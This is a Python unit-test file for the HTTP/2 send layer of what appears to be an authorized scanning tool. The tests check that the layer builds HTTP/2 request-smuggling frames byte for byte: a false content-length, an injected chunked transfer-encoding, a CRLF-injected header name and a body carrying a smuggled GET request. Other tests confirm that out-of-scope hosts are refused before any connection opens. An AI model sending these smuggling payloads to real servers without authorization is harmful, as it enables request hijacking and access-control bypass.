"""Frame-level unit tests for the byte-exact HTTP/2 send layer (h2send).

These prove the send layer constructs the exact prohibited frames an H2.CL /
H2.TE downgrade desync needs -- a lying ``content-length``, an injected
``transfer-encoding: chunked``, and CRLF/colon-injected header names -- reaching
the wire byte-for-byte, non-Huffman, with no validation. A conformant HPACK
decoder (``hpack.Decoder``) is used as an independent oracle: the literal bytes
we emit decode back to the exact pairs we put in.

Also covers scope enforcement parity with rawsend: fail-closed with no scope,
and out-of-scope raising BEFORE any socket opens (pytest-socket).
"""

from __future__ import annotations

import pytest
from hpack import Decoder

from scan_primitives import OutOfScopeError, Scope

from doppelganger import h2send
from doppelganger.h2send import (
    FRAME_DATA,
    FRAME_HEADERS,
    FRAME_SETTINGS,
    H2_PREFACE,
    H2Request,
    H2Sender,
    build_data_frame,
    build_frame,
    build_headers_frame,
    build_settings_ack,
    build_settings_frame,
    encode_header_block,
    encode_integer,
    encode_literal_header,
    serialize_request,
)


# --------------------------------------------------------------------------- #
# HPACK integer encoding (RFC 7541 sec 5.1 worked examples)
# --------------------------------------------------------------------------- #


def test_encode_integer_fits_in_prefix():
    # 10 with a 5-bit prefix fits: single octet 0x0A.
    assert encode_integer(10, 5) == b"\x0a"
    # 42 with an 8-bit prefix: single octet 0x2A.
    assert encode_integer(42, 8) == b"\x2a"


def test_encode_integer_multibyte_rfc_example():
    # RFC 7541 sec 5.1: 1337 with a 5-bit prefix -> 31, 154, 10.
    assert encode_integer(1337, 5) == bytes([31, 154, 10])


# --------------------------------------------------------------------------- #
# literal HPACK header encoding -- byte-exact, non-Huffman, no validation
# --------------------------------------------------------------------------- #


def test_literal_header_is_exact_non_huffman_bytes():
    # 0x00 = literal without indexing, new name; then len-prefixed raw name+value.
    # len("transfer-encoding")=17=0x11, len("chunked")=7=0x07. No Huffman: the
    # ASCII appears verbatim.
    assert encode_literal_header(b"transfer-encoding", b"chunked") == (
        b"\x00\x11transfer-encoding\x07chunked"
    )


def test_header_block_carries_prohibited_headers_verbatim_and_decodes():
    # A lying content-length, an injected transfer-encoding, and a CRLF/colon
    # injected header NAME -- all prohibited/impossible via a validating H2 stack.
    headers = [
        (b":method", b"POST"),
        (b":path", b"/"),
        (b":scheme", b"https"),
        (b":authority", b"target"),
        (b"content-length", b"0"),
        (b"transfer-encoding", b"chunked"),
        (b"x-smuggle\r\nx-injected", b"1"),
    ]
    block = encode_header_block(headers)
    # Literal ASCII present on the wire (byte-exact, not Huffman-coded).
    assert b"transfer-encoding" in block
    assert b"content-length" in block
    assert b"x-smuggle\r\nx-injected" in block
    # Independent oracle: a conformant HPACK decoder recovers the exact pairs.
    assert Decoder().decode(block, raw=True) == headers


# --------------------------------------------------------------------------- #
# frame construction (RFC 7540 sec 4.1)
# --------------------------------------------------------------------------- #


def test_build_frame_header_layout():
    frame = build_frame(FRAME_HEADERS, 0x04, 1, b"abc")
    # 3-byte length, 1 type, 1 flags, 4 stream-id, then payload.
    assert frame[:3] == (3).to_bytes(3, "big")
    assert frame[3] == FRAME_HEADERS == 0x01
    assert frame[4] == 0x04
    assert frame[5:9] == (1).to_bytes(4, "big")
    assert frame[9:] == b"abc"


def test_settings_and_ack_frames():
    assert build_settings_frame() == b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
    ack = build_settings_ack()
    assert ack[3] == FRAME_SETTINGS and ack[4] == 0x01  # ACK flag


def test_headers_frame_flag_semantics():
    # No body -> HEADERS carries END_STREAM (0x1) + END_HEADERS (0x4) = 0x5.
    h_end = build_headers_frame(b"x", 1, end_stream=True)
    assert h_end[3] == FRAME_HEADERS
    assert h_end[4] == 0x05
    # Body to follow -> END_HEADERS only (0x4), NOT END_STREAM.
    h_open = build_headers_frame(b"x", 1, end_stream=False)
    assert h_open[4] == 0x04


def test_data_frame_end_stream_flag():
    d = build_data_frame(b"body", 3, end_stream=True)
    assert d[3] == FRAME_DATA == 0x00
    assert d[4] & 0x01  # END_STREAM
    assert d[5:9] == (3).to_bytes(4, "big")
    assert d[9:] == b"body"


# --------------------------------------------------------------------------- #
# full request serialisation
# --------------------------------------------------------------------------- #


def _frames_after_preface(raw: bytes):
    """Split a serialized request into frames, skipping the connection preface."""
    assert raw.startswith(H2_PREFACE)
    i = len(H2_PREFACE)
    frames = []
    while i < len(raw):
        length = int.from_bytes(raw[i : i + 3], "big")
        ftype = raw[i + 3]
        flags = raw[i + 4]
        sid = int.from_bytes(raw[i + 5 : i + 9], "big")
        payload = raw[i + 9 : i + 9 + length]
        frames.append((ftype, flags, sid, payload))
        i += 9 + length
    return frames


def test_serialize_request_with_body_splits_headers_then_data():
    req = H2Request(
        method=b"POST",
        path=b"/",
        authority=b"target",
        scheme=b"https",
        headers=((b"content-length", b"0"),),
        body=b"0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: target\r\n\r\n",
    )
    raw = serialize_request(req)
    frames = _frames_after_preface(raw)
    # SETTINGS, HEADERS, DATA in order.
    assert [f[0] for f in frames] == [FRAME_SETTINGS, FRAME_HEADERS, FRAME_DATA]
    _, hflags, hsid, hblock = frames[1]
    _, dflags, dsid, dpayload = frames[2]
    # With a body, END_STREAM rides on DATA, never on HEADERS.
    assert not (hflags & 0x01)
    assert dflags & 0x01
    assert hsid == dsid == 1
    assert dpayload == req.body
    # The lying content-length is recoverable from the HEADERS block.
    assert (b"content-length", b"0") in Decoder().decode(hblock, raw=True)


def test_serialize_bodyless_get_sets_end_stream_on_headers():
    req = H2Request.get("target", "/", "https")
    frames = _frames_after_preface(serialize_request(req))
    assert [f[0] for f in frames] == [FRAME_SETTINGS, FRAME_HEADERS]
    _, hflags, _, _ = frames[1]
    assert hflags & 0x01  # END_STREAM on HEADERS (no DATA frame)


def test_h2request_render_is_readable_text():
    req = H2Request(
        method=b"POST", path=b"/", authority=b"t", scheme=b"https",
        headers=((b"transfer-encoding", b"chunked"),), body=b"0\r\n\r\n",
    )
    text = req.render()
    assert ":method: POST" in text
    assert "transfer-encoding: chunked" in text


# --------------------------------------------------------------------------- #
# scope enforcement precedes egress (parity with rawsend)
# --------------------------------------------------------------------------- #


@pytest.fixture
def loopback_scope() -> Scope:
    return Scope.from_entries(["127.0.0.1"])


@pytest.mark.disable_socket
def test_out_of_scope_host_raises_before_any_socket(loopback_scope):
    """An out-of-scope host raises OutOfScopeError and opens NO socket.

    With sockets disabled, a connection attempt would raise SocketBlockedError;
    OutOfScopeError proves the scope check runs before socket creation.
    """
    sender = H2Sender(loopback_scope, timeout=0.5)
    with pytest.raises(OutOfScopeError):
        sender.send("evil.example.net", 443, H2Request.get("evil.example.net", "/"))


@pytest.mark.disable_socket
def test_no_scope_is_fail_closed():
    """An h2 sender with no scope refuses all egress (fail-closed)."""
    sender = H2Sender(None, timeout=0.5)
    with pytest.raises(OutOfScopeError):
        sender.send("127.0.0.1", 80, H2Request.get("127.0.0.1", "/"), use_tls=False)


@pytest.mark.disable_socket
def test_connect_also_scope_checked(loopback_scope):
    """The explicit-reuse connect() path is scope-checked too."""
    sender = H2Sender(loopback_scope, timeout=0.5)
    with pytest.raises(OutOfScopeError):
        sender.connect("169.254.169.254", 443)  # cloud metadata, not in scope
